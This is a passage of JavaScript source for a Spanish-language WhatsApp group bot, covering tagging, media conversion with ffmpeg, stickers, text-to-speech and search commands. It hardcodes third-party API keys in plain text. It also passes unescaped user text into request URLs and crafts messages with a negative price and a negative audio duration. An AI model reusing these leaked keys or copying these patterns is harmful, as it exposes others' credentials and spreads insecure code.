teslagod.sendMessage(from, hidetagbruh, text)
break
case 'l': //Totag etiqueta a todos atravez de una imagen, sticker, video nice xd
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isGroupAdmins && !autonomo) return reply(idiomas.admin())
if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await teslagod.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await teslagod.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: estadouwur1
}
ini_buffer = fs.readFileSync(file)
teslagod.sendMessage(from, ini_buffer, sticker, options)
fs.unlinkSync(file)
} else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await teslagod.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await teslagod.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: estadouwur1
}
ini_buffer = fs.readFileSync(file)
teslagod.sendMessage(from, ini_buffer, image, options)
fs.unlinkSync(file)
} else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await teslagod.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await teslagod.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'audio/mp4',
ptt : true,
contextInfo: { mentionedJid: mem },
quoted: estadouwur1
}
ini_buffer = fs.readFileSync(file)
teslagod.sendMessage(from, ini_buffer, audio, options)
fs.unlinkSync(file)
}  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await teslagod.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await teslagod.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'video/mp4',
contextInfo: { mentionedJid: mem },
quoted: estadouwur1
}
ini_buffer = fs.readFileSync(file)
teslagod.sendMessage(from, ini_buffer, video, options)
fs.unlinkSync(file)
} else{
reply(idiomas.alltag4(prefix))
}
break
case 'grupocreador':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
teslagod.updatePresence(from, Presence.composing) 
options = {
text: idiomas.ownergp() + `\n⚡ @${from.split("-")[0]} ⚡`,
contextInfo: { mentionedJid: [from] }
}
teslagod.sendMessage(from, options, text, { quoted: estadouwur1 } )
break
case 'reconime':
TeslApi = await fetchJson(`https://pastebin.com/raw/ZQjU0P6Z`)
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
if (!isGroup) return reply(idiomas.group())
teslagod.sendMessage(from, '⡏⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠉⠉⠉⠹\n⡇⢸⣿⡟⠛⢿⣷⠀⢸⣿⡟⠛⢿⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡇⠀⢸⣿⡇⠀\n⡇⢸⣿⣧⣤⣾⠿⠀⢸⣿⣇⣀⣸⡿⠃⢸⣿⡇⠀⢸⣿⡇⢸⣿⣇⣀⣸⣿⡇⠀\n⡇⢸⣿⡏⠉⢹⣿⡆⢸⣿⡟⠛⢻⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡏⠉⢹⣿⡇⠀\n⡇⢸⣿⣧⣤⣼⡿⠃⢸⣿⡇⠀⢸⣿⡇⠸⣿⣧⣤⣼⡿⠁⢸⣿⡇⠀⢸⣿⡇⠀\n⣇⣀⣀⣀⣀⣀⣀⣄⣀⣀⣀⣀⣀⣀⣀⣠⣀⡈⠉⣁⣀⣄⣀⣀⣀⣠⣀⣀⣀⣰\n⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷\n⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇\n⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽\n⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕\n⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕\n⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕\n⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄\n⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕\n⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿\n⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟\n⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠\n⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙\n⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣\n' + TeslApi.recomendacion, text, { quoted: estarder })
break
//comandos brrrandom
case 'tienda':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
imeu2 = await teslagod.prepareMessage('0@s.whatsapp.net', fs.readFileSync('./multimedia/imagenes/milogo.jpg'), MessageType.image)
imeg = imeu2.message.imageMessage
  res = await teslagod.prepareMessageFromContent(from,{
  "productMessage": {
    "product": {
      "productImage": imeg,
      "productId": "4458590017530875",
      "title": `${UwU}`,
      "currencyCode": "PEN",
      "priceAmount1000": "-666999",
      "productImageCount": 1
    },
    "businessOwnerJid": "51995386439@s.whatsapp.net"
  }
}, {quoted:mek, sendEphemeral: true}) 

teslagod.relayWAMessage(res)
break
case 'tiendaimg':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isQuotedImage) return reply('Responda una imagen')
var buferium = JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo
var buf = await teslagod.downloadAndSaveMediaMessage(buferium) 
inu_buffer = fs.readFileSync(buf)
imeu2 = await teslagod.prepareMessage('0@s.whatsapp.net', inu_buffer, MessageType.image)
imeg = imeu2.message.imageMessage
  res = await teslagod.prepareMessageFromContent(from,{
  "productMessage": {
    "product": {
      "productImage": imeg,
      "productId": "4458590017530875",
      "title": `${UwU}`,
      "currencyCode": "PEN",
      "priceAmount1000": "-666999",
      "productImageCount": 1
    },
    "businessOwnerJid": "51995386439@s.whatsapp.net"
  }
}, {quoted:mek, sendEphemeral: true}) 

teslagod.relayWAMessage(res)
break
case 'amp3':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isQuotedVideo) return reply(idiomas.aaudio())
reply(idiomas.wait())
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await teslagod.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(idiomas.aaudio2())
buffer = fs.readFileSync(ran)
teslagod.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek})
fs.unlinkSync(ran)
})
break
case 'acelerarvid':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isQuotedVideo) return reply(idiomas.aaudio())
reply(idiomas.wait())
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await teslagod.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Error: ${err}`)
buffer453 = fs.readFileSync(ran)
teslagod.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
fs.unlinkSync(ran)
})
break
case 'lentovid':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isQuotedVideo) return reply(idiomas.aaudio())
reply(idiomas.wait())
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await teslagod.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Error: ${err}`)
buffer453 = fs.readFileSync(ran)
teslagod.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
fs.unlinkSync(ran)
})
break
case 'reversavid':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isQuotedVideo) return reply(idiomas.aaudio())
reply(idiomas.wait())
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await teslagod.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Error: ${err}`)
buffer453 = fs.readFileSync(ran)
teslagod.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
fs.unlinkSync(ran)
})
break
case 'imgalink':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (OnOffLine === true) return reply(idiomas.sinnet())
reply(idiomas.wait())
var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
var jnckk = await  teslagod.downloadAndSaveMediaMessage(encmedia)
var imgbb = require('imgbb-uploader')
imgbb('3b8594f4cb11895f4084291bc655e510', jnckk)
.then(data => {
var caps = `╭─「 IMG LINK 」\n│\n│• ID : ${data.id}\n│• Tipo : ${data.image.mime}\n│• Extensión : ${data.image.extension}\n│\n│• Link : ${data.display_url}\n╰─────────────`
ibb = fs.readFileSync(jnckk)
teslagod.sendMessage(from, ibb, image, { quoted: mek, caption: caps })
})
.catch(err => {
throw err 
})
break
case 'aimg': //Convierte un sticker a imagen (OJO no sirve para stickergifs :v)
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
if (!isQuotedSticker) return reply(idiomas.saimg())
reply(idiomas.wait())
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await teslagod.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(idiomas.saimg2())
buffer = fs.readFileSync(ran)
miniaturaNK(buffer,'>//<')
fs.unlinkSync(ran)
})
break
case 'rescom':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (!isGroup) return reply(idiomas.group())
try {
quotedCaption = mek.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.caption
reply(quotedCaption)
} catch {
reply(idiomas.getmen())
}
break
case 'sticker':
case 'stiker':
case 'stickergif':
case 'stk':
case 's':
case 'estiker':
case 'esticker':
case 'estick':
case 'estik':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await teslagod.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(idiomas.stick())
							})
							.on('end', function () {
								console.log('Finalizado')
								exec(`webpmux -set exif ${addMetadata('NK-BOT', authorname)} ${ran} -o ${ran}`, async (error) => {
									if (error) return reply(idiomas.stick())
									teslagod.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
									fs.unlinkSync(media)	
									fs.unlinkSync(ran)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await teslagod.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(idiomas.wait())
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(idiomas.converror())
							})
							.on('end', function () {
								console.log('Finalizado')
								exec(`webpmux -set exif ${addMetadata('NK-BOT', authorname)} ${ran} -o ${ran}`, async (error) => {
									if (error) return reply(idiomas.stick())
									teslagod.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
									fs.unlinkSync(media)
									fs.unlinkSync(ran)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await teslagod.downloadAndSaveMediaMessage(encmedia)
						ranw = getRandom('.webp')
						ranp = getRandom('.png')
						reply(idiomas.wait())
						keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
						await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp}).then(res => {
							fs.unlinkSync(media)
							let buffer = Buffer.from(res.base64img, 'base64')
							fs.writeFileSync(ranp, buffer, (err) => {
								if (err) return reply(idiomas.converror2())
							})
							exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
								fs.unlinkSync(ranp)
								if (err) return reply(idiomas.stick())
								exec(`webpmux -set exif ${addMetadata('NK-BOT', authorname)} ${ranw} -o ${ranw}`, async (error) => {
									if (error) return reply(idiomas.stick())
									teslagod.sendMessage(from, fs.readFileSync(ranw), sticker, {quoted: mek})
									fs.unlinkSync(ranw)
								})
							})
						})
					} else {
						reply(idiomas.stickerror(prefix))
					}
					break
case 'vos': //Convierte texto a audio 
case 'voz':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
if (!isGroup) return reply(idiomas.group())
if (args.length < 1) return reply(idiomas.voztext())
const gtts = require('./libreria/gtts')(args[0])
if (args.length < 2) return reply(idiomas.voztext2(prefix))
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
dtt.length > 600
? reply(idiomas.voztext3())
: gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(idiomas.voztext4())
teslagod.sendMessage(from, buff, audio, {quoted: mek, mimetype: 'audio/mp4', duration: -51995386439, ptt:true})
fs.unlinkSync(rano)
})
})
break
case 'idiomas': 
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
if (!isGroup) return reply(idiomas.group())
reply(idiomas.voztext5() + `:    ‏  ‌    ‏  ‌

  'af': 'Africano',
  'sq': 'Albanes',
  'ar': 'Arabico',
  'hy': 'Armenio',
  'ca': 'Catalan',
  'zh': 'Chino',
  'zh-cn': 'Chino (Mandarin/China)',
  'zh-tw': 'Chino (Mandarin/Taiwanes)',
  'zh-yue': 'Chino (Cantones)',
  'hr': 'Croata',
  'cs': 'Checo',
  'da': 'Danes',
  'nl': 'Holandes',
  'en': 'Ingles',
  'en-au': 'Ingles (Australia)',
  'en-uk': 'Ingles (Reino unido)',
  'en-us': 'Ingles (Estados unidos)',
  'eo': 'Esperanto',
  'fi': 'Finlandes',
  'fr': 'Frances',
  'de': 'Aleman',
  'el': 'Griego',
  'ht': 'Criollo haitiano',
  'hi': 'Hindio',
  'hu': 'Hungaro',
  'is': 'islandes',
  'id': 'Indonesio',
  'it': 'Italiano',
  'ja': 'Japones',
  'ko': 'Koreano',
  'la': 'Latino',
  'lv': 'Leton',
  'mk': 'Macedonio',
  'no': 'Noruego',
  'pl': 'Polaco',
  'pt': 'Portugues',
  'pt-br': 'Portugues (Brazil)',
  'ro': 'Rumano',
  'ru': 'Ruso',
  'sr': 'Serbio',
  'sk': 'Slovaco',
  'es': 'Español',
  'es-es': 'Español (España)',
  'es-us': 'Español (Estados Unidos)',
  'sw': 'Swahili',
  'sv': 'Sueco',
  'ta': 'Tamil',
  'th': 'Tailandes',
  'tr': 'Turco',
  'vi': 'Vietnamita',
  'cy': 'Gales'`)
break
case 'simi': //Chat-Bot simisimi 🤖
case 'bot':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
if (!isGroup) return reply(idiomas.group())
if (args.length < 1) return reply(idiomas.notext())
chat = body.slice(4)
apichat = await fetchJson(`https://api.simsimi.net/v2/?text=${chat}&lc=mx`, {method: 'get'})
chat = apichat.success
///if (apichat.error) return reply('valio el api xd')///
reply(chat)
break
case 'pinterest': //buscador de imagenes en pinterest uwu
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
if (!isGroup) return reply(idiomas.group())
if(!UwU) return reply(idiomas.pint())
reply(idiomas.wait())
let pin = await hx.pinterest(UwU)
let brandom2 = pin[Math.floor(Math.random() * pin.length)]
let resulttt = await getBuffer(brandom2)
miniaturaNK(resulttt,'Pinterest-Chan ✓')
break
case 'imagen':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
if (!isGroup) return reply(idiomas.group())
if (args.length < 1) return reply(idiomas.gugul())
let gis = promisify(imgugul)
reply(idiomas.wait())
  for (let i = 0; i < 1; i++) {
  results = await gis(`${UwU}`) || []
  let { url, width, height } = pickRandom(results) || {}
  if (!url) return reply('~Lo ciento, ocurrió un error~')
  teslagod.sendFile(from, url, null,`*[ GOOGLE-CHAN ] ✓*\n*~> Resultado para* : _${UwU}_\n*~> Tamaño* : _${width} x ${height} PX_\n    ‏  ‌    ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‏  ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ \n*URL* : _${url}_`.trim(), mek, false,{thumbnail: MyThumb})
}
            break
case 'google':
if (isBaneado) return
if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (OnOffLine === true) return reply(idiomas.sinnet())
if (!isGroup) return reply(idiomas.group())
reply(idiomas.waitt())
let buscar = args.join(' ')
let search = await google({ query: buscar })
let ggsm = ``
for (let i of search) {
ggsm += `\n\n*Titulo :* ${i.title}\n*Link :* ${i.link}\n*Contenido :* ${i.snippet}\n\n`}
var browser = ggsm.trim()
reply(`〘  *GOOGLE* 〙\n_~> Resultados para : ${buscar}_\n    ‏  ‌    ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌